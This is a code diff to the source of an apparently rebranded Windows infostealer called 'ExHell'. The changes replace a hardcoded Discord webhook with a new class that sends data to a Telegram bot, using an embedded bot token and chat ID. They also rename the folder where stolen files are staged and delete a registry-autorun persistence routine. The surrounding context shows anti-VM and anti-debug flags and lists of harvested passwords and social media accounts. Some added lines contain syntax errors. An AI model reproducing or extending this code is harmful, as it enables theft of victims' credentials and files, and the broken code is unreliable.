@@ -12,8 +12,8 @@ import base64
 import time
 
 
-webhook = "https://discord.com/api/webhooks/1347000526759526482/D_EY10ilYFjC-vjnIlLt0kz-cjReqBRQu4sz3gO6Gg36c8HVRhjZhqHeTAOeryhllB1d"
-startup_method = "auto".lower()
+webhook = "TelegramSender"
+startup_method = "False"
 Anti_VM = True
 AntiDebug = True
 FakeError = True
@@ -25,7 +25,8 @@ error_message = (
     0,
 )
 
-StealFiles = True
+StealFiles = False
+
 
 class Variables:
     Passwords = list()
@@ -47,11 +48,6 @@ class Variables:
     InstagramAccounts = list()
     TwitterAccounts = list()
     TikTokAccounts = list()
-    RedditAccounts = list()
-    TwtichAccounts = list()
-    SpotifyAccounts = list()
-    RobloxAccounts = list()
-    RiotGameAccounts = list()
 
 
 class SubModules:
@@ -3160,7 +3156,7 @@ class StealCommonFiles:
                 ("Downloads", os.path.join(os.getenv("userprofile"), "Downloads")),
             )
 
-            destination_directory = os.path.join(self.temp, "StealedFilesByExela")
+            destination_directory = os.path.join(self.temp, "StealedFilesByExHell")
 
             if not os.path.exists(destination_directory):
                 os.makedirs(destination_directory)
@@ -3175,7 +3171,6 @@ class StealCommonFiles:
                 "backup",
             ]
             allowed_extensions = [
-                ".txt",
                 ".doc",
                 ".docx",
                 ".png",
@@ -3187,7 +3182,6 @@ class StealCommonFiles:
                 ".mp4",
                 ".xls",
                 ".xlsx",
-                ".zip",
             ]
 
             for _, source_path in source_directories:
@@ -3251,11 +3245,40 @@ class StealCommonFiles:
             try:
                 os.remove(destination_directory + ".zip")
                 shutil.rmtree(destination_directory)
-            except:
-                pass
-        except:
-            pass
+          except
+             pass
 
+class TelegramSender:
+
+    def __init__(self, token: str, user_id: int):
+      self.__token = "7780803203:AAFKuKEUayxcBAp6ChF3oNlthNV0m0UNp5c"  # Your Telegram bot token
+      self.__user_id = 1937567596
+      self.__url = f"https://api.telegram.org/bot{self.__token}/sendMessage"
+
+    def __send_to_telegram(self, message: str) -> None:
+       
+        payload = {
+            'chat_id': self.__user_id,  # Target user ID
+            'text': message  # Message to send
+        }
+
+        # Send the request to Telegram
+        response = requests.post(self.__url, data=payload)
+
+        # Check for errors in sending
+        if response.status_code == 200:
+            print("[Telegram sender]: Message sent successfully!")
+        else:
+            print(f"[Telegram sender]: Failed to send message. Status code: {response.status_code}")
+
+    def run(self, message: str) -> None:
+        """
+        Launches the sender module for Telegram.
+        """
+        try:
+            self.__send_to_telegram(message)
+        except Exception as e:
+            print(f"[Telegram sender]: {repr(e)}")
 
 class Startup:
     def __init__(self) -> None:
@@ -3280,7 +3303,7 @@ class Startup:
             print("[-] unsupported or unkown startup method!")
         print(f"[+] Succesfully executed startup injection.")
 
-    async def CreatePathAndMelt(self) -> None:
+    async def CreatePathAndMelt(self)
         try:
             if os.path.exists(self.ToPath):  # if the startup file already exist, return
                 return
@@ -3362,28 +3385,6 @@ class Startup:
         except Exception as e:
             print(str(e))  # print error if has error
 
-    async def RegeditStartup(self) -> None:  # regedit method for startup
-        try:
-            if (
-                not self.Privalage
-            ):  # if the code not running admin privilage, copy to HKCU
-                process = await asyncio.create_subprocess_shell(
-                    f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "ExHell Update Service" /t REG_SZ /d "{self.ToPath}" /f',
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                    shell=True,
-                )
-                await process.communicate()
-            else:  # if the code running admin privilage, copy to HKLM
-                process = await asyncio.create_subprocess_shell(
-                    f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "ExHell Update Service" /t REG_SZ /d "{self.ToPath}" /f',
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                    shell=True,
-                )
-                await process.communicate()
-        except Exception as e:
-            print(str(e))
 
     async def FolderStartup(self):  # folder method for startup
         try:
